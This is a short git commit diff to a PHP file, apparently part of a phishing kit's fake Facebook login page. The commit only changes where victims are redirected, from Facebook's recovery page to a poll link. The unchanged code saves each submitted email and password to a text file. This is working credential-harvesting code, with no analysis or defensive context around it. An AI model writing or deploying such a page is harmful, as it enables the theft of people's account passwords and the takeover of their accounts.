e6653f8368ed30bc86e44657116e0cba36fa3c12
dharick <58396545+dharick@users.noreply.github.com>
2021-04-30 16:07:17 +0000

    Update login.php
    Summaa

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://fast-poll.com/poll/a8e2e2b9');
 exit();
 ?>
